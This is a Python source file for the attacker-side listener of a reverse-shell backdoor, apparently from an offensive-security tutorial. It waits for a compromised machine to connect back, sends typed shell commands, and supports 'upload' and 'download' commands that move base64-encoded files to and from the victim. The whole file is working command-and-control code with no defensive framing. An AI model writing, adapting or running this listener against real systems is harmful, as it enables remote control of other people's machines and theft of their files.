#!/usr/bin/env python

import socket
import json
import base64

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Waiting for incoming connection...")
        self.connection, address = listener.accept()
        print("[+] Got Connected.")

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_recv(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute(self,command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_recv()

    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Downloaded successfully."

    def read_file(self,file):
        with open (file,"rb") as file:
            return base64.b64encode(file.read())
    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            #try:
            if command[0] == "upload":
                file_content = self.read_file(command[1])
                command.append(file_content.decode())
            elif command[0] == "cd" and len(command) > 2:
                command[1] = "".join(command[1:])
            result = self.execute(command)

            if command[0] == "download" and "[-] Error" not in result:
                result = self.write_file(command[1],result)
            #except Exception:
            #    result = "[!] An error occured."
            print(result)


my_listener = Listener("ip of your machine","port")
my_listener.run()